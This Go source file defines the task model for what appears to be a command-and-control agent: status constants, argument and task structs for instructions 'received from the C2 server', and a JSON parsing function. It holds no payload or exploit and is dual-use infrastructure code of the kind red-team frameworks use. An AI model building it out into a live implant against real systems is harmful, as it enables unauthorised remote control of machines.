package models

import "encoding/json"

// A TaskStatus represents the status of a task at any given time.
type TaskStatus string

const (
	STATUS_CREATED   TaskStatus = "CREATED"
	STATUS_TASKED    TaskStatus = "TASKED"
	STATUS_COMPLETED TaskStatus = "COMPLETED"
	STATUS_ERROR     TaskStatus = "ERROR"
)

type TaskArgs struct {
	SingleArg any
	ArgList []any
	ArgMap map[string]any
}

// A Task represents one instruction received from the C2 server.
// Each task is required to have an ID, an opcode, and, optionally, arguments.
type Task struct {
	// The task ID
	TaskId string `json:"task_id"`

	// The opcode of the task
	Opcode TaskOpcode `json:"opcode"`

	// Arguments of the task, must be a JSON value
	Args interface{} `json:"args"`
}

// ParseTask parses a JSON string into a Task struct
func ParseTask(task_json string) (Task, error) {
	var parsed Task
	err := json.Unmarshal([]byte(task_json), &parsed)
	return parsed, err
}
